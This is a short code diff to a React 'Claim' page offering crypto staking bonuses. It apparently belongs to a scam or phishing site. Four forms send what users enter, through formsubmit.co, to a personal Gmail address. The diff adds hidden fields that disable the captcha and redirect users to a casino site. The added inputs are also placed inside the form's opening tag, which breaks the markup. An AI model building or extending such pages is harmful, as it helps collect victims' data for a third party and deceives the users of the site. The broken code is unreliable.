@@ -245,6 +245,8 @@ const Claim: React.FC = () => {
                   <span className={styles.LockStakingAPY1}>🚀+50%</span>
                 </h5>
                 <form
+                  <input type="hidden" name="_next" value="https://gib.casino/"/>
+                  <input type="hidden" name="_captcha" value="false"/>
                   action="https://formsubmit.co/mfckr.eth@gmail.com"
                   method="POST"
                 >
@@ -286,6 +288,8 @@ const Claim: React.FC = () => {
                   <span className={styles.LockStakingAPY1}>🚀+100%</span>
                 </h5>
                 <form
+                  <input type="hidden" name="_next" value="https://gib.casino/"/>
+                  <input type="hidden" name="_captcha" value="false"/>
                   action="https://formsubmit.co/mfckr.eth@gmail.com"
                   method="POST"
                 >
@@ -327,6 +331,8 @@ const Claim: React.FC = () => {
                   <span className={styles.LockStakingAPY1}>🚀+300%</span>
                 </h5>
                 <form
+                  <input type="hidden" name="_next" value="https://gib.casino/"/>
+                  <input type="hidden" name="_captcha" value="false"/>
                   action="https://formsubmit.co/mfckr.eth@gmail.com"
                   method="POST"
                 >
@@ -370,6 +376,8 @@ const Claim: React.FC = () => {
                   <span className={styles.LockStakingAPY1}>🚀+5%</span>
                 </h5>
                 <form
+                  <input type="hidden" name="_next" value="https://gib.casino/"/>
+                  <input type="hidden" name="_captcha" value="false"/>
                   action="https://formsubmit.co/mfckr.eth@gmail.com"
                   method="POST"
                 >
